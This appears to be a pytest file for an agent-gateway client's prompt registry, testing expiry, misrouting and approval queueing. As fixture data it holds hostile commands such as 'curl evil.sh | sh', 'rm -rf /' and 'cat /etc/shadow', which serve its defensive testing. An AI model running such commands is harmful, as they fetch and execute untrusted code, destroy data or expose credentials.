"""R8: outstanding prompts are keyed, visible, and cannot be misrouted.

R8 has four clauses and each one is a separate failure:

1. keyed by the gateway's ``request_id`` — so two prompts cannot be confused;
2. visible for as long as it is outstanding — so the operator knows to answer;
3. expiry clears the control but leaves a persistent transcript indication — so
   the question does not silently vanish from a conversation that still refers
   to it;
4. a late response cannot be attached to a different request.

The fourth is the one with teeth. The gateway tolerates a late respond and
answers ``{"status": "expired"}`` (``tui_gateway/server.py:10233-10235``), which
means the socket will happily accept a misrouted answer — so the refusal has to
happen client-side, in the registry that knows which ids are live.
"""

from __future__ import annotations

from dataclasses import replace

from talaria.domain.projection import prompt_view, status_payload, turn_status
from talaria.domain.state import (
    APPROVAL_AGED_OUT,
    APPROVAL_COMMAND_LABEL,
    APPROVAL_STALE_AFTER,
    REFUSED_APPROVAL_NOT_HEAD,
    REFUSED_NOT_OUTSTANDING,
    REFUSED_SWITCH_WHILE_ANSWERING,
    REFUSED_UNCORRELATED_APPROVAL,
    REFUSED_WRONG_SESSION,
    age_out_approvals,
    focus_session,
    latch_resolved_prompts,
    respond_to_all_approvals,
    respond_to_prompt,
    restore_prompt,
    settle_prompt,
    switch_refusal,
)

from .conftest import BASE_TIME, raw_event, replay


def test_a_prompt_is_registered_under_its_request_id_and_shown() -> None:
    state = replay(
        [
            raw_event(
                "clarify.request",
                {"request_id": "req-1", "question": "Which file?", "choices": ["a", "b"]},
            )
        ]
    )
    prompt = state.prompt_for("req-1")
    assert prompt is not None
    assert prompt.kind == "clarify"
    assert prompt.summary == "Which file?"
    assert prompt.choices == ("a", "b")
    assert [e.kind for e in state.transcript] == ["prompt"]


def test_two_prompts_are_kept_apart_by_request_id() -> None:
    state = replay(
        [
            raw_event("clarify.request", {"request_id": "req-1", "question": "First?"}),
            raw_event("sudo.request", {"request_id": "req-2"}),
        ]
    )
    assert [p.request_id for p in state.prompts] == ["req-1", "req-2"]

    answered, refusal = respond_to_prompt(state, "req-1")
    assert refusal is None
    assert [p.request_id for p in answered.prompts] == ["req-2"]


def test_a_repeated_request_does_not_register_twice() -> None:
    state = replay(
        [
            raw_event("clarify.request", {"request_id": "req-1", "question": "Which?"}),
            raw_event("clarify.request", {"request_id": "req-1", "question": "Which?"}),
        ]
    )
    assert len(state.prompts) == 1


def test_a_waiting_session_does_not_look_like_a_working_one() -> None:
    state = replay(
        [
            raw_event("message.start"),
            raw_event("message.delta", {"text": "let me check"}),
            raw_event("clarify.request", {"request_id": "req-1", "question": "Which?"}),
        ]
    )
    assert state.turn == "streaming"
    assert turn_status(state) == "waiting"
    payload = status_payload(state, mode="live")
    assert payload.turn == "waiting"
    assert payload.pending_prompts == 1


def test_expiry_clears_the_control_but_leaves_a_transcript_trace() -> None:
    state = replay(
        [
            raw_event("clarify.request", {"request_id": "req-1", "question": "Which file?"}),
            raw_event("clarify.expire", {"request_id": "req-1"}),
        ]
    )
    assert state.prompts == ()
    kinds = [e.kind for e in state.transcript]
    assert kinds == ["prompt", "prompt-expired"]
    assert "Which file?" in state.transcript[-1].text


def test_a_stale_expiry_cannot_close_a_different_prompt() -> None:
    """Re-encodes the id-matched clear at
    ``createGatewayEventHandler.ts:1174-1182``."""
    state = replay(
        [
            raw_event("sudo.request", {"request_id": "req-live"}),
            raw_event("sudo.expire", {"request_id": "req-stale"}),
        ]
    )
    assert [p.request_id for p in state.prompts] == ["req-live"]


def test_every_bridge_expires_through_the_same_registry() -> None:
    """The gateway emits ``.expire`` for all four blocking bridges
    (``tui_gateway/server.py:2989-2998``); the shipping terminal UI handles only
    ``sudo`` and ``secret``."""
    frames = [
        raw_event("clarify.request", {"request_id": "c", "question": "?"}),
        raw_event("secret.request", {"request_id": "s", "env_var": "API_KEY"}),
        raw_event("sudo.request", {"request_id": "u"}),
        raw_event("terminal.read.request", {"request_id": "t"}),
        raw_event("clarify.expire", {"request_id": "c"}),
        raw_event("secret.expire", {"request_id": "s"}),
        raw_event("sudo.expire", {"request_id": "u"}),
        raw_event("terminal.read.expire", {"request_id": "t"}),
    ]
    state = replay(frames)
    assert state.prompts == ()
    assert len([e for e in state.transcript if e.kind == "prompt-expired"]) == 4


def test_a_late_respond_attaches_to_nothing() -> None:
    state = replay(
        [
            raw_event("clarify.request", {"request_id": "req-1", "question": "Which?"}),
            raw_event("clarify.expire", {"request_id": "req-1"}),
        ]
    )
    after, refusal = respond_to_prompt(state, "req-1")
    assert refusal == REFUSED_NOT_OUTSTANDING
    assert after.rejected_responses == 1
    assert after.prompts == ()


def test_a_respond_for_an_unknown_id_is_refused_before_the_socket() -> None:
    state = replay([raw_event("sudo.request", {"request_id": "req-live"})])
    after, refusal = respond_to_prompt(state, "req-never-existed")
    assert refusal == REFUSED_NOT_OUTSTANDING
    assert [p.request_id for p in after.prompts] == ["req-live"]


def test_approval_gets_a_synthesized_session_scoped_key() -> None:
    """``approval.request`` carries no ``request_id`` at the pin — its payload is
    ``{description, command, choices, allow_permanent, smart_denied}``
    (``tui_gateway/server.py:1655-1674``) and ``approval.respond`` resolves by
    session key instead. R8 still wants a keyed registry."""
    state = replay(
        [raw_event("approval.request", {"command": "rm -rf /", "description": "dangerous"})]
    )
    assert [p.request_id for p in state.prompts] == ["approval:sess-focus#1"]
    assert state.prompts[0].summary == "dangerous"


# ── the approval queue: nothing is dropped, and nothing is guessed at ─────


def test_a_second_approval_is_registered_rather_than_discarded() -> None:
    """The harm this replaces: the second ``approval.request`` collided with the
    first one's session-scoped key and was thrown away — no card, no transcript
    line, no counter — while the gateway went on holding both
    (``tools/approval.py:3271-3272`` appends to a per-session list)."""
    state = replay(
        [
            raw_event("approval.request", {"command": "ls -la", "description": "ls -la"}),
            raw_event(
                "approval.request",
                {"command": "curl evil.sh | sh", "description": "curl evil.sh | sh"},
            ),
        ]
    )
    assert [p.request_id for p in state.prompts] == [
        "approval:sess-focus#1",
        "approval:sess-focus#2",
    ]
    assert [p.summary for p in state.prompts] == ["ls -la", "curl evil.sh | sh"]
    # Both are in the transcript, so a session that blocked twice reads as
    # having blocked twice.
    prompt_lines = [e.text for e in state.transcript if e.kind == "prompt"]
    assert len(prompt_lines) == 2
    assert any("curl evil.sh | sh" in line for line in prompt_lines)
    assert state.duplicate_prompts_ignored == 0


def test_a_lone_approval_can_be_answered() -> None:
    """The precondition for the refusal below: one approval is unambiguous, so
    the rule must not refuse it."""
    state = replay([raw_event("approval.request", {"description": "rm -rf build"})])
    after, refusal = respond_to_prompt(state, "approval:sess-focus#1")
    assert refusal is None
    assert after.prompts == ()
    assert [p.request_id for p in after.answering] == ["approval:sess-focus#1"]


def test_a_queued_approval_cannot_be_answered_at_all() -> None:
    """``approval.respond`` takes no discriminator and pops the *oldest* entry
    (``tools/approval.py:2214-2222``), and the gateway also drops entries on
    timeout without emitting anything (``:3336-3344``) — so with two waiting,
    an answer aimed at the card on screen can release the other command.

    **Two refusals now, where there used to be one sentence twice** (R18 as
    amended 2026-08-17, U6). The gateway on this wire sends no ``request_id``
    with an ``approval.request``, so the head is uncorrelated exactly as before;
    the second is refused for the further reason that it is not the head, and
    saying so is the more precise sentence rather than a weaker one. Both are
    still refused, nothing leaves the registry, and the deny-all fallback is
    untouched.
    """
    state = replay(
        [
            raw_event("approval.request", {"description": "ls -la"}),
            raw_event("approval.request", {"description": "curl evil.sh | sh"}),
        ]
    )
    expected = {
        "approval:sess-focus#1": REFUSED_UNCORRELATED_APPROVAL,
        "approval:sess-focus#2": REFUSED_APPROVAL_NOT_HEAD,
    }
    for request_id, reason in expected.items():
        after, refusal = respond_to_prompt(state, request_id)
        assert refusal == reason
        # Nothing left the registry, so nothing can be reported as answered.
        assert [p.request_id for p in after.prompts] == [
            "approval:sess-focus#1",
            "approval:sess-focus#2",
        ]
        assert after.answering == ()
        assert after.rejected_responses == 1


def test_the_head_approval_is_answerable_when_the_gateway_sent_its_id() -> None:
    """R18's amendment, 2026-08-17: an observed request id is what the refusal
    was standing in for.

    The running revision synthesizes a ``request_id`` on every approval entry
    (``tools/approval.py:2596``) and emits it with the request, so the answer can
    name the entry it means and the queue-head hazard is closed by correlation
    rather than by refusal. The second approval stays refused whatever id it
    carries: the gateway resolves from the head, so an answer aimed past it
    would land on the head anyway.
    """
    state = replay(
        [
            raw_event("approval.request", {"request_id": "ap-1", "description": "ls -la"}),
            raw_event("approval.request", {"request_id": "ap-2", "description": "curl | sh"}),
        ]
    )
    assert [p.request_id for p in state.prompts] == ["ap-1", "ap-2"]
    assert [p.observed_request_id for p in state.prompts] == ["ap-1", "ap-2"]

    answered, refusal = respond_to_prompt(state, "ap-1")
    assert refusal is None
    assert [p.request_id for p in answered.answering] == ["ap-1"]

    blocked, refusal = respond_to_prompt(state, "ap-2")
    assert refusal == REFUSED_APPROVAL_NOT_HEAD
    assert blocked.answering == ()


def test_denying_them_all_takes_the_whole_queue_at_once() -> None:
    """The one answer that needs no correlation: ``resolve_all`` applies one
    choice to every entry (``tools/approval.py:2219-2226``), so it is right
    whatever order the queue is in."""
    state = replay(
        [
            raw_event("approval.request", {"description": "ls -la"}),
            raw_event("approval.request", {"description": "curl evil.sh | sh"}),
            raw_event("sudo.request", {"request_id": "u-1"}),
        ]
    )
    after, scope = respond_to_all_approvals(state, session_id="sess-focus")

    assert [p.summary for p in scope.taken] == ["ls -la", "curl evil.sh | sh"]
    assert scope.already_in_flight == ()
    assert scope.denied == 2
    assert scope.undecided == 0
    # The sudo prompt is a different bridge and is left alone.
    assert [p.request_id for p in after.prompts] == ["u-1"]
    assert len(after.answering) == 2


# ── the in-flight window: an expiry that lands while the answer travels ──


def test_an_expiry_during_an_in_flight_answer_still_leaves_a_marker() -> None:
    """``respond_to_prompt`` empties ``prompts`` before the call goes out, and an
    expiry arriving in that window used to match nothing: no transcript marker
    at all for a question that timed out."""
    state = replay([raw_event("sudo.request", {"request_id": "u-1"})])
    state, refusal = respond_to_prompt(state, "u-1")
    assert refusal is None
    assert state.prompts == ()

    expired = replay([raw_event("sudo.expire", {"request_id": "u-1"})], state=state)

    markers = [e.text for e in expired.transcript if e.kind == "prompt-expired"]
    assert markers == ["sudo prompt expired unanswered: sudo password required"]
    # Session-qualified (sess-focus:u-1), not bare — see ``_flush_key``.
    assert "sess-focus:u-1" in expired.flushed_prompt_ids
    assert expired.answering == ()


def test_a_control_expired_mid_answer_is_not_put_back_by_a_failed_send() -> None:
    """The whole point of ``flushed_prompt_ids``, which could not fire before:
    the gateway has stopped listening, so re-offering the control leaves it
    outstanding forever — no second ``.expire`` is ever emitted."""
    state = replay([raw_event("sudo.request", {"request_id": "u-1"})])
    prompt = state.prompt_for("u-1")
    assert prompt is not None
    state, _ = respond_to_prompt(state, "u-1")
    state = replay([raw_event("sudo.expire", {"request_id": "u-1"})], state=state)

    restored = restore_prompt(state, prompt)

    assert restored.prompts == ()
    assert restored.answering == ()
    assert turn_status(restored) != "waiting"


def test_a_failed_send_puts_the_control_back_when_nothing_expired() -> None:
    """The discriminating half: without an expiry the restore must happen, or
    the guard above would be indistinguishable from a broken restore."""
    state = replay([raw_event("sudo.request", {"request_id": "u-1"})])
    prompt = state.prompt_for("u-1")
    assert prompt is not None
    state, _ = respond_to_prompt(state, "u-1")

    restored = restore_prompt(state, prompt)

    assert [p.request_id for p in restored.prompts] == ["u-1"]
    assert restored.answering == ()


def test_a_re_announced_prompt_is_deduped_and_counted() -> None:
    """A ``request_id`` already outstanding is the gateway re-announcing a live
    prompt across a reconnect (F6). Keeping the first record is right; doing it
    invisibly is what let a dropped approval look like nothing at all."""
    state = replay(
        [
            raw_event("clarify.request", {"request_id": "req-1", "question": "Which?"}),
            raw_event("clarify.request", {"request_id": "req-1", "question": "Which?"}),
        ]
    )
    assert len(state.prompts) == 1
    assert state.duplicate_prompts_ignored == 1


def test_an_abandoned_clarify_is_flushed_when_its_tool_completes() -> None:
    """Re-encodes ``flushAbandonedClarify``
    (``createGatewayEventHandler.ts:399-426``, called at ``:1122-1127``): the
    backend's blocking wait timed out and returned an empty answer, so the
    prompt is unanswerable but still on screen."""
    state = replay(
        [
            raw_event("clarify.request", {"request_id": "req-1", "question": "Which file?"}),
            raw_event("tool.complete", {"tool_id": "t1", "name": "clarify"}),
        ]
    )
    assert state.prompts == ()
    expired = [e for e in state.transcript if e.kind == "prompt-expired"]
    assert len(expired) == 1
    assert "Which file?" in expired[0].text


def test_an_abandoned_clarify_is_recorded_once_across_both_paths() -> None:
    """The dedupe set re-encodes ``persistedAbandonedClarify`` (``:399-402``),
    which exists because two independent paths can notice the same
    abandonment."""
    state = replay(
        [
            raw_event("clarify.request", {"request_id": "req-1", "question": "Which file?"}),
            raw_event("clarify.expire", {"request_id": "req-1"}),
            raw_event("tool.complete", {"tool_id": "t1", "name": "clarify"}),
        ]
    )
    assert len([e for e in state.transcript if e.kind == "prompt-expired"]) == 1


def test_a_prompt_summary_reads_only_named_outbound_fields() -> None:
    """Every credential on this protocol travels the direction a listener cannot
    see (R9). Reading only the named fields keeps it that way if a payload
    grows a new one."""
    state = replay(
        [
            raw_event(
                "secret.request",
                {
                    "request_id": "req-1",
                    "env_var": "OPENAI_API_KEY",
                    "prompt": "Paste the key",
                    "value": "sk-should-never-be-here",
                },
            )
        ]
    )
    rendered = "\n".join(e.text for e in state.transcript)
    assert "sk-should-never-be-here" not in rendered
    assert "Paste the key" in rendered


# ── the approval whose answer is in flight is still the gateway's ────────


def test_an_approval_answered_a_moment_ago_still_counts_as_outstanding() -> None:
    """``outstanding_approvals`` describes the **gateway's** queue, not the
    screen.

    ``respond_to_prompt`` moves a prompt into ``answering`` before the call goes
    out, so reading ``prompts`` alone made the approval just answered invisible
    for the length of one round trip — to the very rule that exists to stop a
    second one being answered.
    """
    state = replay([raw_event("approval.request", {"description": "rm -rf /data"})])
    state, refusal = respond_to_prompt(state, "approval:sess-focus#1")
    assert refusal is None
    assert state.prompts == ()

    assert [p.summary for p in state.outstanding_approvals("sess-focus")] == ["rm -rf /data"]


def test_a_second_approval_arriving_mid_answer_cannot_be_answered() -> None:
    """The harm, in the registry. With the first answer still travelling, the
    second approval was answerable — so two ``approval.respond`` calls went out
    against a resolver that pops the FIFO head with no discriminator, and which
    command each released was decided by arrival order.

    The refusal names the head-of-queue rule since R18's amendment of
    2026-08-17: the first approval is still outstanding at the gateway while its
    answer travels, so the second is not the head and is refused for that reason.
    Refused either way — the safety property is what this test pins, and the
    sentence the operator reads is the more precise of the two."""
    state = replay([raw_event("approval.request", {"description": "rm -rf /data"})])
    state, refusal = respond_to_prompt(state, "approval:sess-focus#1")
    assert refusal is None

    state = replay([raw_event("approval.request", {"description": "ls"})], state=state)
    assert [p.summary for p in state.prompts] == ["ls"]

    after, refusal = respond_to_prompt(state, "approval:sess-focus#2")

    assert refusal == REFUSED_APPROVAL_NOT_HEAD
    assert [p.request_id for p in after.prompts] == ["approval:sess-focus#2"]
    assert after.rejected_responses == 1


def test_the_projection_marks_the_second_approval_unanswerable_mid_answer() -> None:
    """The other consumer of the same rule. Both have to agree, or the card
    offers a button the registry will refuse — or worse, the registry allows
    what the card should never have offered."""
    state = replay([raw_event("approval.request", {"description": "rm -rf /data"})])
    state, _ = respond_to_prompt(state, "approval:sess-focus#1")
    state = replay([raw_event("approval.request", {"description": "ls"})], state=state)

    rows = prompt_view(state).rows

    assert [row.request_id for row in rows] == ["approval:sess-focus#2"]
    assert rows[0].answerable is False
    assert "still waiting" in rows[0].blocked_reason


def test_a_lone_approval_is_still_answerable_once_the_earlier_one_settles() -> None:
    """The discriminating half. A rule that never lets an approval be answered
    would satisfy every assertion above and break the feature — so the same
    sequence with the first answer settled must come out answerable."""
    state = replay([raw_event("approval.request", {"description": "rm -rf /data"})])
    state, _ = respond_to_prompt(state, "approval:sess-focus#1")
    state = settle_prompt(state, "approval:sess-focus#1")
    state = replay([raw_event("approval.request", {"description": "ls"})], state=state)

    assert len(state.outstanding_approvals("sess-focus")) == 1
    assert prompt_view(state).rows[0].answerable is True
    _, refusal = respond_to_prompt(state, "approval:sess-focus#2")
    assert refusal is None


def test_outstanding_approvals_are_ordered_by_arrival_not_by_where_they_sit() -> None:
    """The gateway's resolver pops oldest-first, so this order is a claim about
    which command an answer would reach. Concatenating ``prompts`` and
    ``answering`` gives the wrong one: ``answering`` holds what was answered
    most recently, which is routinely *older* than what is still on screen."""
    state = replay(
        [
            raw_event("approval.request", {"description": "first"}),
            raw_event("approval.request", {"description": "second"}),
        ]
    )
    # Answer the older one, so it moves to ``answering`` while the newer one
    # stays in ``prompts`` — the arrangement a naive concatenation reverses.
    state, refusal = respond_to_all_approvals(state, session_id="sess-focus")
    state = settle_prompt(state, "approval:sess-focus#2")
    state = replay([raw_event("approval.request", {"description": "third"})], state=state)

    assert [p.summary for p in state.outstanding_approvals("sess-focus")] == [
        "first",
        "third",
    ]


def test_denying_them_all_names_the_one_it_does_not_take_without_claiming_it() -> None:
    """``all: true`` reaches every entry in the gateway's queue, so an approval
    whose own answer is in flight is swept too.

    Two claims, and the split between them is the point. It is **named**,
    because an operator told "2 denied" when the denial swept three is being
    misled about a safety action. It is **not taken**, because the call that
    owns it will settle or restore it when its reply lands. And it is **not
    counted as denied**, because its own respond may be carrying the affirmative
    the operator pressed a second earlier, and which of the two the gateway
    applies is decided by arrival order there — summing the two groups into one
    "denied" total put two different fates for one command into one transcript.
    """
    state = replay([raw_event("approval.request", {"description": "rm -rf /data"})])
    state, _ = respond_to_prompt(state, "approval:sess-focus#1")
    state = replay(
        [
            raw_event("approval.request", {"description": "ls"}),
            raw_event("approval.request", {"description": "cat /etc/shadow"}),
        ],
        state=state,
    )

    after, scope = respond_to_all_approvals(state, session_id="sess-focus")

    assert [p.summary for p in scope.taken] == ["ls", "cat /etc/shadow"]
    assert [p.summary for p in scope.already_in_flight] == ["rm -rf /data"]
    # Named, and named apart: two denied by this call, one more the ``all``
    # reaches whose outcome this call cannot speak for.
    assert scope.denied == 2
    assert scope.undecided == 1
    # The in-flight entry is not duplicated into the set its own call will
    # settle: two owners means either a double settle or a resurrected control.
    assert [p.request_id for p in after.answering] == [
        "approval:sess-focus#1",
        "approval:sess-focus#2",
        "approval:sess-focus#3",
    ]


def test_deny_all_refuses_when_every_approval_is_already_in_flight() -> None:
    """Nothing on screen to deny, and the answers that exist are travelling.
    Sending another denial would deliver a second value for questions that
    already have one."""
    state = replay([raw_event("approval.request", {"description": "rm -rf /data"})])
    state, _ = respond_to_prompt(state, "approval:sess-focus#1")

    after, scope = respond_to_all_approvals(state, session_id="sess-focus")

    assert scope.taken == ()
    assert after.rejected_responses == 1


def test_the_command_is_kept_beside_the_description_not_folded_into_it() -> None:
    """At the pin the gateway sends both, and ``description`` is the joined
    pattern warnings (``tools/approval.py:3616``) — so a summary that prefers it
    names the warning and never names the command."""
    state = replay(
        [
            raw_event(
                "approval.request",
                {
                    "description": "recursive delete outside the workspace",
                    "command": "rm -rf / --no-preserve-root",
                },
            )
        ]
    )
    prompt = state.prompt_for("approval:sess-focus#1")
    assert prompt is not None
    assert prompt.summary == "recursive delete outside the workspace"
    assert prompt.command == "rm -rf / --no-preserve-root"
    # And the arrival entry — the one durable record that is never clipped —
    # carries the command on its own line.
    arrival = next(e for e in state.transcript if e.kind == "prompt")
    assert arrival.text.splitlines() == [
        "approval prompt awaiting an answer: recursive delete outside the workspace",
        "command: rm -rf / --no-preserve-root",
    ]


def test_only_approval_carries_a_command() -> None:
    """A ``command`` key on any other bridge is a payload Talaria does not read.
    Rendering one would put gateway text on a card whose contract says the
    summary is the whole question."""
    state = replay(
        [raw_event("clarify.request", {"request_id": "c-1", "question": "which?", "command": "x"})]
    )
    prompt = state.prompt_for("c-1")
    assert prompt is not None
    assert prompt.command == ""


# ── approval is the one bridge with no gateway timeout announcement ──────


def test_a_stale_approval_is_withdrawn_and_stops_blocking_the_queue() -> None:
    """The gateway emits ``<bridge>.expire`` for ``secret``, ``sudo``,
    ``clarify`` and ``terminal.read`` and for nothing else
    (``tui_gateway/server.py:2981-2998``); ``tools/approval.py`` drops its own
    entry on timeout through ``_drop_entry()`` with no emit. So ``_EXPIRE_EVENTS``
    correctly has no ``approval.expire`` — and nothing else aged one out either.

    The consequence is not cosmetic. A phantom approval keeps
    ``outstanding_approvals`` above one, which marks a *genuine* later approval
    unanswerable, which leaves the operator unable to allow the command they
    want to allow while the only offered action denies it.
    """
    state = replay(
        [
            raw_event("approval.request", {"description": "stale", "command": "rm -rf /old"}),
            raw_event("approval.request", {"description": "real", "command": "ls"}),
        ]
    )
    fresh = state.prompt_for("approval:sess-focus#2")
    assert fresh is not None
    assert all(not row.answerable for row in prompt_view(state).rows)

    # One second past the older approval's deadline and one second short of the
    # newer one's, so the boundary itself is under test rather than assumed.
    after = age_out_approvals(state, now=fresh.opened_at + APPROVAL_STALE_AFTER - 1.0)

    assert [p.request_id for p in after.prompts] == ["approval:sess-focus#2"]
    assert [row.answerable for row in prompt_view(after).rows] == [True]
    assert turn_status(after) == "waiting"
    # The latch, so a late ``restore_prompt`` cannot put back a control the
    # operator has already been told is gone.
    assert "approval:sess-focus#1" in after.flushed_prompt_ids
    restored = restore_prompt(after, state.prompts[0])
    assert [p.request_id for p in restored.prompts] == ["approval:sess-focus#2"]


def test_the_withdrawal_claims_nothing_about_what_the_gateway_did() -> None:
    """The gateway's approval timeout is *configurable*
    (``_get_approval_timeout()``, ``tools/approval.py:2648-2657``), so Talaria
    knows the default and the failure direction and not the real deadline. It
    may say the wait has probably passed. It may not say the command was
    denied, however likely that is — no reply said so."""
    state = replay(
        [raw_event("approval.request", {"description": "stale", "command": "rm -rf /old"})]
    )
    after = age_out_approvals(state, now=BASE_TIME + APPROVAL_STALE_AFTER + 1.0)

    note = next(e for e in after.transcript if e.kind == "prompt-expired")
    assert APPROVAL_AGED_OUT in note.text
    assert "probably stopped waiting" in note.text
    assert "nothing was sent" in note.text
    assert "denied" not in note.text
    # The command is carried, on its own line, so the withdrawal is auditable
    # against the arrival entry that announced it.
    assert note.text.splitlines()[-1] == f"{APPROVAL_COMMAND_LABEL}rm -rf /old"


def test_the_age_out_leaves_alone_everything_it_cannot_speak_for() -> None:
    """Three exclusions, each of them a way a local timeout could do damage.

    The other four bridges have a real ``.expire`` coming, so ageing them out
    locally would write a second, differently worded marker for one timeout. An
    approval in ``answering`` has a bounded call of its own that will settle or
    restore it, and two owners for one entry is the bookkeeping defect this
    module already carries two comments about. And a corpus whose timestamps did
    not parse reads as ``0.0``, which is an absent time rather than an ancient
    one.
    """
    state = replay(
        [
            raw_event("sudo.request", {"request_id": "u-1"}),
            raw_event("clarify.request", {"request_id": "c-1", "question": "which?"}),
            raw_event("approval.request", {"description": "in flight"}),
        ]
    )
    state, refusal = respond_to_prompt(state, "approval:sess-focus#1")
    assert refusal is None

    after = age_out_approvals(state, now=BASE_TIME + 10 * APPROVAL_STALE_AFTER)

    assert [p.request_id for p in after.prompts] == ["u-1", "c-1"]
    assert [p.request_id for p in after.answering] == ["approval:sess-focus#1"]
    assert after.transcript == state.transcript

    undated = replace(
        replay([raw_event("approval.request", {"description": "no clock"})]),
        prompts=(),
    )
    stale = replay([raw_event("approval.request", {"description": "no clock"})])
    undated = replace(undated, prompts=(replace(stale.prompts[0], opened_at=0.0),))
    assert age_out_approvals(undated, now=BASE_TIME + 10 * APPROVAL_STALE_AFTER) is undated
    assert age_out_approvals(stale, now=0.0) is stale


def test_the_age_out_is_driven_by_the_clock_its_prompt_was_stamped_with() -> None:
    """AE2 asks that replaying one corpus twice produce identical state. A
    recorded frame carries the time it was recorded at, so a wall-clock read
    here would age out an entire corpus on its first tick and make the result
    depend on when the replay was run."""
    state = replay([raw_event("approval.request", {"description": "recorded"})])
    assert age_out_approvals(state, now=state.last_observed_at) is state
    assert age_out_approvals(state, now=state.last_observed_at) == age_out_approvals(
        state, now=state.last_observed_at
    )


# ── switching sessions: what must be cleared, kept, and refused (R8) ──────


def test_a_switch_clears_the_withdrawal_count_it_cannot_speak_for() -> None:
    """``withdrawn_approvals`` says "an approval was taken off this session's
    screen and what happens next is unknown". Carried into the session switched
    to, it makes that session's activity line hedge about a withdrawal that
    never happened there — and nothing in that session will ever clear it,
    because the counter is retired by the *agent* moving
    (``_clear_withdrawal_on_progress``) and the withdrawn approval belongs to a
    conversation no longer on screen."""
    state = replay(
        [raw_event("approval.request", {"description": "stale", "command": "rm -rf /old"})]
    )
    withdrawn = age_out_approvals(state, now=BASE_TIME + APPROVAL_STALE_AFTER + 1.0)
    assert withdrawn.withdrawn_approvals == 1
    assert prompt_view(withdrawn).withdrawn == 1

    # Three, as the queue's measured failing case had it, so the reset is not
    # confused with a decrement.
    switched = focus_session(replace(withdrawn, withdrawn_approvals=3), "sess-b")
    assert switched.withdrawn_approvals == 0
    assert prompt_view(switched).withdrawn == 0


def test_a_switch_is_refused_while_an_answer_is_travelling() -> None:
    """A late outcome is applied to whatever state exists when the call returns.
    Switch inside that window and session A's answer writes session B's
    transcript, or puts session A's control back on session B's screen
    (``restore_prompt``). The refusal costs one RPC round trip."""
    state = replay([raw_event("sudo.request", {"request_id": "req-1"})])
    answering, refusal = respond_to_prompt(state, "req-1")
    assert refusal is None
    assert [p.request_id for p in answering.answering] == ["req-1"]

    assert switch_refusal(answering) == REFUSED_SWITCH_WHILE_ANSWERING
    # Refused, and nothing at all changed — not the focus, not the registry.
    assert focus_session(answering, "sess-b") is answering

    settled = settle_prompt(answering, "req-1")
    assert switch_refusal(settled) == ""
    switched = focus_session(settled, "sess-b")
    assert switched.focused_session_id == "sess-b"
    assert switched.prompts == ()


def test_a_latched_prompt_id_cannot_be_restored_after_a_switch() -> None:
    """``flushed_prompt_ids`` is the only thing standing between an answer that
    reached no socket and a resurrected control, and the gateway never sends a
    second expiry. Clearing the latch on switch is what lets a prompt the
    operator was told had expired come back."""
    state = replay(
        [
            raw_event("sudo.request", {"request_id": "req-1"}),
            raw_event("sudo.expire", {"request_id": "req-1"}),
        ]
    )
    expired = state.transcript[-1]
    assert expired.kind == "prompt-expired"
    # Session-qualified (sess-focus:req-1), not bare — see ``_flush_key``.
    assert "sess-focus:req-1" in state.flushed_prompt_ids
    prompt = replay([raw_event("sudo.request", {"request_id": "req-1"})]).prompts[0]

    switched = focus_session(state, "sess-b")
    assert "sess-focus:req-1" in switched.flushed_prompt_ids, (
        "the tombstone survives the switch"
    )
    assert restore_prompt(switched, prompt).prompts == ()


def test_a_prompt_survives_a_switch_away_and_back() -> None:
    """The high finding (CR3 #1): clearing ``prompts`` on every
    ``focus_session`` call orphaned an outstanding prompt the gateway was
    still blocking on and never re-announced — switching away and back used
    to come back to an empty registry with no way to ever answer the control
    again. Retaining the registry is safe because ``prompt_view``'s session
    filter (:func:`~talaria.domain.projection.prompt_view`) keeps a foreign
    session's prompt off screen without discarding it."""
    state = replay([raw_event("sudo.request", {"request_id": "req-1"})])
    assert [p.request_id for p in state.prompts] == ["req-1"]
    assert [row.request_id for row in prompt_view(state).rows] == ["req-1"]

    away = focus_session(state, "sess-b")
    assert [p.request_id for p in away.prompts] == ["req-1"], "the registry keeps it"
    assert prompt_view(away).rows == (), "but session B does not render session A's prompt"

    back = focus_session(away, "sess-focus")
    assert [row.request_id for row in prompt_view(back).rows] == ["req-1"], (
        "the prompt renders again once session A is refocused"
    )
    answering, refusal = respond_to_prompt(back, "req-1")
    assert refusal is None, "and it is still answerable, not merely visible"
    assert [p.request_id for p in answering.answering] == ["req-1"]


def test_turn_status_and_pending_count_ignore_an_unfocused_sessions_prompt() -> None:
    """U7 round two, a direct consequence of CR3's fix above. Now that
    ``prompts`` survives a switch instead of being cleared,
    :func:`~talaria.domain.projection.turn_status` and
    :func:`~talaria.domain.projection.status_payload`'s ``pending_prompts``
    must filter to the focused session the same way
    :func:`~talaria.domain.projection.prompt_view` already does — reading
    the registry unfiltered reported ``waiting`` (and counted a phantom
    pending prompt) for a session that has nothing outstanding on screen at
    all.
    """
    state = replay([raw_event("sudo.request", {"request_id": "req-1"})])
    assert turn_status(state) == "waiting"
    assert status_payload(state, mode="live").pending_prompts == 1

    away = focus_session(state, "sess-b")
    assert turn_status(away) == "idle", "session B has nothing outstanding"
    assert status_payload(away, mode="live").pending_prompts == 0

    back = focus_session(away, "sess-focus")
    assert turn_status(back) == "waiting", "session A's own prompt is outstanding again"
    assert status_payload(back, mode="live").pending_prompts == 1


def test_a_tombstone_in_one_session_does_not_block_the_same_id_in_another() -> None:
    """The medium finding (CR3 #2): tombstones used to be keyed by bare
    ``request_id``, so with ``flushed_prompt_ids`` now retained across a
    switch (the fix above), session A's expired ``req-1`` would permanently
    block session B's own, independently arrived ``req-1`` — a control the
    gateway is still holding open could never be restored after its own
    answer reached no socket."""
    state = replay(
        [
            raw_event("sudo.request", {"request_id": "req-1"}),
            raw_event("sudo.expire", {"request_id": "req-1"}),
        ]
    )
    assert "sess-focus:req-1" in state.flushed_prompt_ids

    switched = focus_session(state, "sess-b")
    in_b = replay(
        [raw_event("sudo.request", {"request_id": "req-1"}, session_id="sess-b")],
        switched,
    )
    prompt_b = in_b.prompt_for("req-1")
    assert prompt_b is not None
    answering, refusal = respond_to_prompt(in_b, "req-1")
    assert refusal is None

    restored = restore_prompt(answering, prompt_b)
    assert [p.request_id for p in restored.prompts] == ["req-1"], (
        "session A's tombstone must not block session B's own req-1"
    )


def test_a_synthesized_id_latched_in_one_session_does_not_block_the_next() -> None:
    """Approval keys are synthesized because ``approval.request`` carries no
    request id. They are session-qualified, but the counter is what keeps them
    unique across a *return* to a session already visited: reset per landing, a
    second visit to ``sess-focus`` would mint ``approval:sess-focus#1`` again
    and the tombstone from the first visit would swallow the new prompt — no
    card, for a command the gateway is holding."""
    state = replay([raw_event("approval.request", {"description": "first", "command": "ls"})])
